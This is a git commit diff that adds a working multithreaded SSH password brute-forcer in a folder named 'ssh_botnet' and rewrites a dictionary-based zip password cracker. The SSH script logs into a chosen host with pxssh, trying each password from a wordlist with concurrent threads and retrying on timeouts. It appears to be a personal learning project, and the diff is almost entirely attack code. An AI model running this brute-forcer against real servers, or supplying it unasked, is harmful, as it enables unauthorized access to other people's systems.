a182f0884ed876c2b7d43e8b41d66490f134944b
Kevin Dienst <kevin.dienst@gmail.com>
2019-07-02 09:33:49 -0500

    Update zip crack to fix exceptions

--- ssh_botnet/sshBrute.py
+++ ssh_botnet/sshBrute.py
@@ -3,10 +3,70 @@
 # usage: sshBrute.py --host 10.10.10.10 --user root -F password.txt
 # example: sshBrute.py
 # changelog: 12/17/18 - initial creation
+# changelog: 02/12/19 - finished working prototype
 
 '''
 To Do:
-Automate bruteforcing of usernames and password combinations as well
-
 '''
 
+from pexpect import pxssh
+import argparse
+import time
+from threading import *
+
+maxConnections = 5
+connection_lock = BoundedSemaphore(value=maxConnections)
+Found = False
+Fails = 0
+
+def connect(host, user, password, release):
+    global Found
+    global Fails
+    try:
+        s = pxssh.pxssh()
+        s.login(host, user, password)
+        print('[+] Password Found: {}'.format(password))
+        Found = True
+    except Exception as e:
+        if 'read_nonblocking' in str(e):
+            Fails += 1
+            time.sleep(5)
+            connect(host, user, password, False)
+        elif 'synchronize with original prompt' in str(e):
+            time.sleep(1)
+            connect(host, user, password, False)
+    finally:
+        if release:
+            connection_lock.release()
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('--host',nargs='?', action="store", dest="host", help="The host to target for scanning.")
+    parser.add_argument('--user',nargs='?', action="store", dest="user", help="The username to brute-force.")
+    parser.add_argument('--file',nargs='?', default="passwordlist.txt", action="store", dest="passfile", help="The    password list to reference.")
+
+    args = parser.parse_args()
+
+    host = args.host
+    passfile = args.passfile
+    user = args.user
+
+    if host == None or passfile == None or user == None:
+        parser.print_help()
+
+    with open(passfile, 'r') as passList:
+        for line in passList.readlines():
+            if Found:
+                print('[+] Exiting: Password Found')
+                sys.exit(0)
+            if Fails > 5:
+                print('[!] Exiting: Too many socket timeouts.')
+                sys.exit(1)
+            connection_lock.acquire()
+            password = line.strip('\r').strip('\n')
+            print('[-] Testing: {}'.format(password))
+            t = Thread(target=connect, args=(host, user, password, True))
+            child = t.start()
+
+if __name__ == '__main__':
+    main()
--- zip crack/crack_zip.py
+++ zip crack/crack_zip.py
@@ -1,60 +1,43 @@
 # author: axi0m
 # purpose: rudimentary zip cracker
 # usage: crack_zip.py --zip --passfile
-# changelog: 10/12/18 - initial creation
-# 10/25/2018 - kddiens - adding loop for the password database file
-# 11/12/2018 - kddiens - added threading, moved main logic to main function
-# 12/11/2018 - kddiens - actually added threading for real this time
-'''
 
-To do:
-1. Add a lot more robust exception handling
-2. Add minimal test cases
-3. Add logging
-4. Add counter/progress tracker
-4. Examine if adding eventing or threading or map would improve performance of extract attempts
-'''
-
-import zipfile
+from zipfile import ZipFile
+from zipfile import BadZipFile
 import argparse
-from threading import Thread
 
 parser = argparse.ArgumentParser()
-parser.add_argument('--file', nargs='?', default='F:\Sample.zip', action="store", dest='file', help="The zip file to crack.")
-parser.add_argument('--pwdfile', nargs='?', default='F:\password_test.txt', action="store", dest="pwdfile", help="The reference password file.")
+parser.add_argument('--file', nargs='?', action="store", dest='file', help="The zip file to crack.")
+parser.add_argument('--pwdfile', nargs='?', action="store", dest="pwdfile", help="The reference password file.")
 
 args = parser.parse_args()
 
 zfile = args.file
-passfile = args.pwdfile
+pfile = args.pwdfile
 
-def extractfile(zfile, password):
-    # Wrap a try/catch to help with error handling
+def extractfile(zf, word):
+
     try:
-        zfile.extractall(pwd=password.encode('utf=8'))
-        print("[+] Password found: {}".format(password))
-        #exit(0)
-    except RuntimeError as runerr:
-        if 'Bad password for file' in str(runerr):
-            print('[!] Incorrect password: {}'.format(password))
-        else:
-            print('[!] Runtime error encounter: {}'.format(runerr))
-    except Exception as ex:
-        print(ex)
-        return
+        zf.extractall(pwd=word.encode('utf-8'))
+        print("[+] Password found: {}".format(word))
 
-def main(zfile, passfile):
-    counter = 0
-    zFile = zipfile.ZipFile(zfile)
-    with open(passfile, 'r') as dictFile:
-        for word in dictFile:
-            counter += 1
-        # Strip the new line character
-            word = word.strip('\n')
-            t = Thread(target=extractfile, args=(zFile, word))
-            t.start()
-            #extractfile(zFile, word)
-    print('Total Guessed Passwords: {}'.format(counter))
+    except RuntimeError:
+        pass # To Do
+    
+    except Exception as err:
+        return err
+
+def main(zfile, pfile):
+
+    try:
+        with ZipFile(zfile) as zf:
+            with open(pfile, 'r') as dictFile:
+                for word in dictFile:
+                    word = word.strip('\n')
+                    extractfile(zf, word)
+
+    except BadZipFile as err:
+        print("[!] Bad zip file encountered: {}".format(err))
 
 if __name__ == "__main__":
-    main(zfile, passfile)
+    main(zfile, pfile)
